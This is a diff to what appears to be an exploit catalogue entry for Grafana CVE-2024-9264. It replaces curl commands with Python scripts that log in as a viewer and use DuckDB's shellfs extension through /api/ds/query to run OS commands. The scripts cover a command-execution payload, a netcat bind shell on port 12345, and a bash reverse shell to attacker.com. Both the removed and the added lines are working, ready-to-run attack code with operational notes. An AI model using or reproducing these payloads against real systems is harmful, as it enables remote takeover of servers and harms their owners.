@@ -25,29 +25,31 @@ functions:
   bind-shell:
   - blind: true
     code: |
-      COOKIE=$(curl -s -c - -X POST 'http://victim.com:3000/login' \
-        -H 'Content-Type: application/json' \
-        -d '{"user":"viewer","password":"viewer"}' | grep grafana_session | awk '{print $7}')
-
-      curl -s -X POST 'http://victim.com:3000/api/ds/query' \
-        -H 'Content-Type: application/json' \
-        -H "Cookie: grafana_session=${COOKIE}" \
-        -d '{
-          "queries": [{
-            "refId": "A",
-            "datasource": {"type": "grafana-testdata-datasource"},
-            "scenarioId": "csv_content",
-            "csvContent": "a\n1",
-            "rawSql": "INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv(\"/dev/stdin\", auto_detect=true, sample_size=1) WITH (PROGRAM=\"nc -lvp 12345 -e /bin/sh\")",
-            "format": "table"
-          }]
-        }'
+      # python3 exploit_bind.py
+      import requests
+      TARGET = "http://victim.com:3000"
+      sess = requests.Session()
+      sess.post(f"{TARGET}/login", json={"user": "viewer", "password": "viewer"})
+      sess.post(
+          f"{TARGET}/api/ds/query",
+          params={"ds_type": "__expr__", "expression": "true", "requestId": "Q101"},
+          json={
+              "queries": [{
+                  "refId": "A",
+                  "datasource": {"type": "__expr__", "uid": "__expr__"},
+                  "type": "sql",
+                  "expression": "INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('ncat -lvp 12345 -e /bin/sh 2>&1|', auto_detect=true, sample_size=1)"
+              }],
+              "from": "now-1h", "to": "now"
+          }
+      )
     comment: |
-      CVE-2024-9264: opens a bind shell on TCP port 12345 via the DuckDB shellfs extension.
-      The API request returns immediately (DuckDB runs nc asynchronously via shellfs).
+      CVE-2024-9264: opens a bind shell on TCP 12345 via the DuckDB shellfs extension.
+      The shellfs pipe suffix syntax ('cmd 2>&1|') executes the command and streams its
+      output as a virtual CSV file read by DuckDB. The query must target the __expr__
+      datasource (type: sql, expression field) at /api/ds/query?ds_type=__expr__&expression=true.
       Connect from the attacker with: nc victim.com 12345
-      Requires SQL Expressions enabled and DuckDB on PATH (see rce entry).
-      Inbound firewall rules on the Grafana host may block the port.
+      Requires SQL Expressions enabled (feature_toggles.sqlExpressions = true) and DuckDB on PATH.
     connector: tcp-client
     contexts:
       authenticated:
@@ -80,38 +82,36 @@ functions:
   rce:
   - blind: false
     code: |
-      # Step 1: authenticate and obtain a session cookie (viewer account is sufficient)
-      COOKIE=$(curl -s -c - -X POST 'http://victim.com:3000/login' \
-        -H 'Content-Type: application/json' \
-        -d '{"user":"viewer","password":"viewer"}' | grep grafana_session | awk '{print $7}')
-
-      # Step 2: create a panel with a SQL Expression using DuckDB shellfs to execute a command
-      # POST to a dashboard save endpoint or use the Explore panel; the query below
-      # is sent to the /api/ds/query endpoint with the sql-ds-express datasource type:
-      curl -s -X POST 'http://victim.com:3000/api/ds/query' \
-        -H 'Content-Type: application/json' \
-        -H "Cookie: grafana_session=${COOKIE}" \
-        -d '{
-          "queries": [{
-            "refId": "A",
-            "datasource": {"type": "grafana-testdata-datasource"},
-            "scenarioId": "csv_content",
-            "csvContent": "a\n1",
-            "rawSql": "INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv(\"/dev/stdin\", auto_detect=true, sample_size=1) WITH (PROGRAM=\"id\")",
-            "format": "table"
-          }]
-        }'
+      # python3 exploit_rce.py
+      import requests, json as _json
+      TARGET = "http://victim.com:3000"
+      sess = requests.Session()
+      sess.post(f"{TARGET}/login", json={"user": "viewer", "password": "viewer"})
+      resp = sess.post(
+          f"{TARGET}/api/ds/query",
+          params={"ds_type": "__expr__", "expression": "true", "requestId": "Q101"},
+          json={
+              "queries": [{
+                  "refId": "A",
+                  "datasource": {"type": "__expr__", "uid": "__expr__"},
+                  "type": "sql",
+                  "expression": "INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('id 2>&1|', auto_detect=true, sample_size=1)"
+              }],
+              "from": "now-1h", "to": "now"
+          }
+      )
+      # Command output in: resp.json()["results"]["A"]["frames"][0]["data"]["values"]
+      print(_json.dumps(resp.json(), indent=2))
     comment: |
       CVE-2024-9264: The SQL Expressions feature passes user-supplied SQL to DuckDB without
-      sanitisation. The DuckDB shellfs extension allows reading command output as a virtual
-      file, effectively executing arbitrary OS commands.
+      sanitisation. The DuckDB shellfs community extension reads command output as a virtual
+      CSV file, executing arbitrary OS commands as the grafana-server process user.
 
-      Prerequisites:
-      - SQL Expressions feature enabled (set feature_toggles.sqlExpressions = true in grafana.ini)
-      - DuckDB binary available on the Grafana server PATH
-      - Any authenticated account (viewer privileges are sufficient)
+      The query MUST target the internal __expr__ datasource (not any user-defined datasource).
+      The /api/ds/query endpoint requires ?ds_type=__expr__&expression=true query parameters
+      to route through the SQL Expressions engine. Any authenticated account (viewer+) is sufficient.
 
-      Command output is returned in the query response JSON under results.A.frames.
+      Command output appears in: results.A.frames[0].data.values
       Ref: https://github.com/advisories/GHSA-49qr-ph23-6g7x
     contexts:
       authenticated:
@@ -147,23 +147,30 @@ functions:
       admin:
   reverse-shell:
   - blind: true
-    code: "# Same CVE-2024-9264 SQL injection path \u2014 replace the shellfs program\
-      \ with a reverse shell\nCOOKIE=$(curl -s -c - -X POST 'http://victim.com:3000/login'\
-      \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"user\":\"viewer\",\"\
-      password\":\"viewer\"}' | grep grafana_session | awk '{print $7}')\n\ncurl -s\
-      \ -X POST 'http://victim.com:3000/api/ds/query' \\\n  -H 'Content-Type: application/json'\
-      \ \\\n  -H \"Cookie: grafana_session=${COOKIE}\" \\\n  -d '{\n    \"queries\"\
-      : [{\n      \"refId\": \"A\",\n      \"datasource\": {\"type\": \"grafana-testdata-datasource\"\
-      },\n      \"scenarioId\": \"csv_content\",\n      \"csvContent\": \"a\\n1\"\
-      ,\n      \"rawSql\": \"INSTALL shellfs; LOAD shellfs; SELECT * FROM read_csv(\\\
-      \"/dev/stdin\\\", auto_detect=true, sample_size=1) WITH (PROGRAM=\\\"bash -c\
-      \ '\\''bash -i >& /dev/tcp/attacker.com/12345 0>&1'\\''\\\")\",\n      \"format\"\
-      : \"table\"\n    }]\n  }'\n"
-    comment: "CVE-2024-9264: spawns a reverse bash shell via the DuckDB shellfs extension.\n\
-      The shell runs as the grafana-server process user (typically grafana or root\
-      \ in containers).\nThe HTTP response will not contain output \u2014 check the\
-      \ listener for the incoming connection.\nRequires SQL Expressions enabled and\
-      \ DuckDB on PATH (see rce entry).\n"
+    code: |
+      # python3 exploit_revshell.py
+      import requests
+      TARGET = "http://victim.com:3000"
+      sess = requests.Session()
+      sess.post(f"{TARGET}/login", json={"user": "viewer", "password": "viewer"})
+      sess.post(
+          f"{TARGET}/api/ds/query",
+          params={"ds_type": "__expr__", "expression": "true", "requestId": "Q101"},
+          json={
+              "queries": [{
+                  "refId": "A",
+                  "datasource": {"type": "__expr__", "uid": "__expr__"},
+                  "type": "sql",
+                  "expression": "INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('bash -i >& /dev/tcp/attacker.com/12345 0>&1 2>&1|', auto_detect=true, sample_size=1)"
+              }],
+              "from": "now-1h", "to": "now"
+          }
+      )
+    comment: |
+      CVE-2024-9264: spawns a reverse bash shell via the DuckDB shellfs extension.
+      The shell runs as the grafana-server process user (typically grafana or root in containers).
+      The HTTP response returns immediately — check the listener for the incoming connection.
+      Requires SQL Expressions enabled (feature_toggles.sqlExpressions = true) and DuckDB on PATH.
     contexts:
       authenticated:
     listener: tcp-server
